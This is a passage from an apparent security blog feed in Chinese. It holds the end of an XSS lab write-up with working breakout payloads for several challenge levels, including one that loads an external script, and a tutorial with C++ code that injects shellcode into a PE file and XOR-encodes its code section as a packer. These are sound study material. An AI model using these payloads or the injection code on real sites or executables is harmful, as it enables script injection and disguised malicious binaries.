&#39;I&#39;，&quot;ſ&quot;.toUpperCase() == &#39;S&#39;</code></p><p>所以：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=<span class="string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在属性中编码仍然有效，也就是之前说的””内：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;); alert(1); //</span></span><br></pre></td></tr></table></figure><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一道非常简单只需要闭合就行的题：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span>;</span><br><span class="line">alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题给我一种宽字节注入的既视感，将字符都进行转义为\；</p><p>实际上也是和0x0F一样的类型；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;); alert(1); //</span></span><br></pre></td></tr></table></figure><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不让用”但是可以双转义，用自己的斜杠去转义它的斜杠：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">&quot;); alert(1);//</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;类型分类&quot;&gt;&lt;a href=&quot;#类型分类&quot; class=&quot;headerlink&quot; title=&quot;类型分类&quot;&gt;&lt;/a&gt;类型分类&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;反射型：payload存在于恶意链接，没有存在于服务器内，被攻击者点击遭罪；&lt;/li&gt;
&lt;li&gt;存储型：payl</summary>
      
    
    
    
    <category term="Lab" scheme="https://secondbc.github.io/SecondBC/categories/Lab/"/>
    
    
    <category term="Web" scheme="https://secondbc.github.io/SecondBC/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>壳进阶</title>
    <link href="https://secondbc.github.io/SecondBC/2024/02/26/%E5%A3%B3%E8%BF%9B%E9%98%B6/"/>
    <id>https://secondbc.github.io/SecondBC/2024/02/26/%E5%A3%B3%E8%BF%9B%E9%98%B6/</id>
    <published>2024-02-26T08:45:00.000Z</published>
    <updated>2024-04-13T10:44:39.232Z</updated>
    
    <content type="html"><![CDATA[<h2 id="壳的原理"><a href="#壳的原理" class="headerlink" title="壳的原理"></a>壳的原理</h2><p>PE文件到运行时经过的几步重要步骤：</p><ul><li>将硬盘中的PE文件复制到内存中；</li><li>按内存对齐值对齐；</li><li>加载dll等模块；</li><li>修复IAT，重定位表；</li><li>进入OEP（Original Entry Point）开始执行</li></ul><p>壳的原理则是修改OEP （可选PE头） 指向自身代码的地址，执行完后返回真正的OEP；</p><p>壳位于PE文件所处位置需要是可执行区段内，如.text；</p><p>计算OEP偏移地址用于jmp指令返回公式：</p><p>jmp E9 xxxxxxxx = OEP - 此指令下一指令地址</p><h2 id="添加shellcode到PE"><a href="#添加shellcode到PE" class="headerlink" title="添加shellcode到PE"></a>添加shellcode到PE</h2><p>使用010editor：</p><ol><li>添加一个空白区段在PE末尾 （1000h同时满足文件内存对齐）；</li><li>添加一个区段头；</li><li>修正新加区段的属性（通过最后一个区段头开始以及大小计算新加区段的各属性）；</li><li>修改 numberofsections （PE头）；</li><li>修改 sizeofimage （可选PE头）；</li><li>将shellcode粘贴于新区段处；</li><li>修改OEP于shellcode处；</li></ol><p>如果遇到区段头无空余部分问题，可将PE头和区段头之间内容平移向上覆盖掉DOS存根，并且改掉 lfanew 偏移，之后可添加；</p><p>亦或者直接扩大最后一个区段，并修改属性；</p><p>或者合并区段：</p><ol><li>读取PE文件模拟内存对齐对每个区段进行拉伸（防止其他区段合并后偏移错误）；</li><li>只保留第一个区段头信息，其他填充0；</li><li>修改第一个区段头属性；</li><li>修改numberofsections；</li><li>将更改后的PE文件保存为新文件；</li></ol><p>这样做会导致原文件扩大，但在内存中的大小不会改变，此时有足够的空间塞入壳代码；</p><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><h3 id="为壳代码写入准备"><a href="#为壳代码写入准备" class="headerlink" title="为壳代码写入准备"></a>为壳代码写入准备</h3><p>如之前插入区段的方式与思路用代码操作PE，此时创建一个叫MyShell的类：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyShell</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">char</span>* fileBuff;</span><br><span class="line">DWORD fileSize;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader;</span><br><span class="line">PIMAGE_FILE_HEADER pFileHeader;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptionHeader;</span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">MyShell</span>();</span><br><span class="line">~<span class="built_in">MyShell</span>();</span><br><span class="line"><span class="function">BOOL <span class="title">LoadFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">SaveFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">InitFileInfo</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">InsertSection</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* sectionName, DWORD codeSize, <span class="keyword">char</span>* codeBuff, DWORD dwCharateristics)</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">GetAlignSize</span><span class="params">(DWORD realSize, DWORD alignSize)</span></span>;</span><br><span class="line">    <span class="function">BOOL <span class="title">EncodeSections</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">DWORD <span class="title">GetOep</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetOep</span><span class="params">(DWORD OEP)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第一步，读取文件并创建buffer保存PE镜像；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MyShell::LoadFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, <span class="number">0</span>, <span class="number">0</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//获取镜像</span></span><br><span class="line">fileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="number">0</span>);</span><br><span class="line">fileBuff = <span class="keyword">new</span> <span class="keyword">char</span>[fileSize] &#123;&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ReadFile</span>(hFile, fileBuff, fileSize, <span class="number">0</span>, <span class="number">0</span>) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;文件获取失败！&quot;</span>, <span class="string">&quot;异常&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">InitFileInfo</span>();</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步，解析PE（各个头）；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基于 fileBuff 镜像</span></span><br><span class="line"><span class="function">BOOL <span class="title">MyShell::InitFileInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">pDosHeader = (PIMAGE_DOS_HEADER)fileBuff;</span><br><span class="line">pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + fileBuff);</span><br><span class="line">pFileHeader = &amp;(pNtHeader-&gt;FileHeader);</span><br><span class="line">pOptionHeader = &amp;(pNtHeader-&gt;OptionalHeader);</span><br><span class="line">pSectionHeader = (PIMAGE_SECTION_HEADER)(pFileHeader-&gt;SizeOfOptionalHeader + (DWORD)pOptionHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三步，插入区段和区段头，设置属性并修改PE某些字段；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MyShell::InsertSection</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* sectionName, DWORD codeSize, <span class="keyword">char</span>* codeBuff, DWORD dwCharateristics)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//判断节区头是否剩下两个头的空位</span></span><br><span class="line">DWORD SectionCount = pFileHeader-&gt;NumberOfSections;</span><br><span class="line">DWORD EndOfSectionHeader = (DWORD)pSectionHeader + SectionCount * IMAGE_SIZEOF_SECTION_HEADER;</span><br><span class="line">DWORD BeginOfSection = (DWORD)fileBuff + pOptionHeader-&gt;SizeOfHeaders;</span><br><span class="line"><span class="keyword">if</span> (BeginOfSection - EndOfSectionHeader &lt; IMAGE_SIZEOF_SECTION_HEADER * <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;插入失败，节区头大小不足！&quot;</span>, <span class="string">&quot;异常&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取新PE文件大小并建立新buff存放新PE</span></span><br><span class="line">DWORD newFileSize = <span class="built_in">GetAlignSize</span>(fileSize + codeSize, pOptionHeader-&gt;FileAlignment);</span><br><span class="line"><span class="keyword">char</span>* newFileBuff = <span class="keyword">new</span> <span class="keyword">char</span>[newFileSize] &#123;&#125;;</span><br><span class="line"><span class="built_in">memcpy_s</span>(newFileBuff, newFileSize, fileBuff, fileSize);</span><br><span class="line">fileSize = newFileSize;</span><br><span class="line"><span class="keyword">delete</span>[] fileBuff;</span><br><span class="line">fileBuff = newFileBuff;</span><br><span class="line"><span class="built_in">InitFileInfo</span>();</span><br><span class="line"><span class="comment">//新增区段添加区段头并添加属性:名字，内存大小，文件大小，内存地址，文件偏移，权限</span></span><br><span class="line">PIMAGE_SECTION_HEADER lastSectionHeader = pSectionHeader + (SectionCount - <span class="number">1</span>);</span><br><span class="line">PIMAGE_SECTION_HEADER newSectionHeader = lastSectionHeader + <span class="number">1</span>;</span><br><span class="line"><span class="built_in">strcpy_s</span>((<span class="keyword">char</span> *)newSectionHeader-&gt;Name, <span class="number">8</span>, sectionName);</span><br><span class="line">newSectionHeader-&gt;Misc.VirtualSize = <span class="built_in">GetAlignSize</span>(codeSize, pOptionHeader-&gt;SectionAlignment);</span><br><span class="line">newSectionHeader-&gt;SizeOfRawData = <span class="built_in">GetAlignSize</span>(codeSize, pOptionHeader-&gt;FileAlignment);</span><br><span class="line">newSectionHeader-&gt;VirtualAddress = lastSectionHeader-&gt;VirtualAddress + <span class="built_in">GetAlignSize</span>(lastSectionHeader-&gt;Misc.VirtualSize, pOptionHeader-&gt;SectionAlignment);</span><br><span class="line">newSectionHeader-&gt;PointerToRawData = lastSectionHeader-&gt;PointerToRawData + lastSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">newSectionHeader-&gt;Characteristics = dwCharateristics;</span><br><span class="line">newSectionHeader-&gt;PointerToLinenumbers = <span class="number">0</span>;</span><br><span class="line">newSectionHeader-&gt;PointerToRelocations = <span class="number">0</span>;</span><br><span class="line">newSectionHeader-&gt;NumberOfLinenumbers = <span class="number">0</span>;</span><br><span class="line">newSectionHeader-&gt;NumberOfRelocations = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//修改numberofsections以及sizeofimage</span></span><br><span class="line">pFileHeader-&gt;NumberOfSections++;</span><br><span class="line">pOptionHeader-&gt;SizeOfImage += <span class="built_in">GetAlignSize</span>(codeSize, pOptionHeader-&gt;SectionAlignment);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//添加shellcode</span></span><br><span class="line"><span class="keyword">char</span>* sectionBuff = newSectionHeader-&gt;PointerToRawData + fileBuff;</span><br><span class="line"><span class="built_in">memcpy</span>(sectionBuff, codeBuff, codeSize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存对齐</span></span><br><span class="line"><span class="function">DWORD <span class="title">MyShell::GetAlignSize</span><span class="params">(DWORD realSize, DWORD alignSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (realSize % alignSize == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> realSize;</span><br><span class="line"><span class="keyword">return</span> (realSize / alignSize + <span class="number">1</span>) * alignSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四步，保存文件；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MyShell::SaveFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_WRITE, <span class="number">0</span>, <span class="number">0</span>, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WriteFile</span>(hFile, fileBuff, fileSize, <span class="number">0</span>, <span class="number">0</span>) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;保存文件失败！&quot;</span>, <span class="string">&quot;异常&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，用代码实现了之前用010手动粘贴shellcode之前的所有步骤；</p><h3 id="对原程序编码加密"><a href="#对原程序编码加密" class="headerlink" title="对原程序编码加密"></a>对原程序编码加密</h3><p>加壳难度逐级递进，此时先考虑对.text段的加密，因为.data段有IAT表等东西需要处理；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MyShell::EncodeSections</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key = <span class="number">0xBC</span>;</span><br><span class="line"><span class="keyword">char</span>* pData = pSectionHeader-&gt;PointerToRawData + fileBuff;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pSectionHeader-&gt;SizeOfRawData; i++)</span><br><span class="line">pData[i] ^= key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="制作壳代码"><a href="#制作壳代码" class="headerlink" title="制作壳代码"></a>制作壳代码</h3><p>之前写的壳代码是需要手动从ida里扣的，这里的壳代码写在dll文件里，使用link命令合并区段只剩代码段，此时第一节区便是需要的shellcode；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码段数据段合并</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/merge:.data=.text&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/merge:.rdata=.text&quot;</span>)</span></span><br><span class="line"><span class="comment">//设置属性</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/section:.text,RWE&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>壳代码的特点：</p><ul><li>拥有解密功能；</li><li>拥有保护功能；</li></ul><p>难点：</p><ul><li>壳代码是后期写入文件里，系统无法修复壳代码的iat，需要动态调用API；</li><li>壳代码如果有全局变量，会涉及到重定位，需要修复壳的重定位表；</li></ul><p>其具体构造如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">Code</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//保存寄存器环境</span></span><br><span class="line">__asm pushad</span><br><span class="line"><span class="comment">//实现逻辑</span></span><br><span class="line"><span class="built_in">GetAPI</span>();</span><br><span class="line"><span class="built_in">DecodeSections</span>();</span><br><span class="line"><span class="built_in">MyCode</span>();</span><br><span class="line"><span class="comment">//恢复寄存器环境并跳入真正OEP</span></span><br><span class="line">__asm popad</span><br><span class="line">__asm jmp g_OepInfo.oldOEP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原OEP以及新OEP的传递需要用到dll的结构体导出，以便exe和dll交换OEP信息，其结构体如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OEPINFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">DWORD newOEP;</span><br><span class="line">DWORD oldOEP;</span><br><span class="line">&#125;OEPINFO, * POEPINFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) OEPINFO g_OepInfo;</span><br><span class="line"></span><br><span class="line">OEPINFO g_OepInfo = &#123; (DWORD)Code &#125;;</span><br></pre></td></tr></table></figure><p>在之前的MyShell类里给出了OEP的set和get方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">MyShell::GetOep</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> pOptionHeader-&gt;AddressOfEntryPoint + pOptionHeader-&gt;ImageBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输入的OEP实际上为Code函数距离其节区开始的偏移</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyShell::SetOep</span><span class="params">(DWORD OEP)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD SectionCount = pFileHeader-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER pLastSectionHeader = pSectionHeader + (SectionCount - <span class="number">1</span>);</span><br><span class="line">pOptionHeader-&gt;AddressOfEntryPoint = 